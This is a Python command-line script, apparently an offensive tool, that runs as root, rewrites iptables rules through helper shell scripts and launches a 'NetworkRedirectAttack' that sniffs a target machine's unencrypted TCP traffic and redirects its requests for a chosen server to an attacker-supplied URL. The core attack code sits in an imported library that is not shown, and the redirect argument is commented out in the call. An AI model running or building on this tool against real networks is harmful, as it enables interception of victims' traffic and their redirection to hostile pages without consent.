from networklib.networkredirect import NetworkRedirectAttack

import argparse
import subprocess
import os


def setup_shell(target_ip: str):
    env_vars = os.environ.copy()

    print("[*] Setting up iptables configuration...")
    result = subprocess.run(
        ["./scripts/os-proxy-setup.sh", target_ip],
        capture_output=True,
        text=True,
        env=env_vars
    )

    if result.stderr:
        print(result.stderr)
        exit()

    print(result.stdout)
    print("[*] Done.")


def clean_shell(target_ip: str):
    env_vars = os.environ.copy()
    env_vars["TARGET_IP"] = target_ip

    print("[*] Cleaning up iptables configuration...")
    result = subprocess.run(
        ["./scripts/os-proxy-reverse.sh", target_ip],
        capture_output=True,
        text=True,
        env=env_vars
    )

    if result.stderr:
        print(result.stderr)
        exit()

    print(result.stdout)
    print("[*] Done.")


def proc(target_ip: str, target_server: str, redirect_url: str):
    try:
        setup_shell(target_ip)
        attack = NetworkRedirectAttack(
            target_ip=target_ip,
            target_server=target_server,
            # location_redirect=redirect_url,
        )

        attack.execute()
        clean_shell(target_ip)
    except KeyboardInterrupt:
        clean_shell(target_ip)
    except Exception as e:
        print(f"[-] Error: {e}")
        clean_shell(target_ip)

def main():
    #######################
    #  Parser definition  #
    #######################
    parser = argparse.ArgumentParser(
        description="Active raw network sniffer targeting unencrypted TCP traffic."
    )

    parser.add_argument(
        "target_ip", 
        help="The target IP address on which packet will be monitored and redirected if the target_server is matched"
    )

    parser.add_argument(
        "target_server",
        help="The target IP address the server where if matched--will be redirected to specified redirect_url"
    )

    parser.add_argument(
        "redirect_url",
        help="The full http(s) URL where the target_ip will be redirected"
    )

    args = parser.parse_args()

    ################################
    #  Main logic for the process  #
    ################################
    if os.getuid() != 0:
        print("[-] This needs to run as root")
        exit(1)

    proc(args.target_ip, args.target_server, args.redirect_url)


if __name__ == "__main__":
    main()
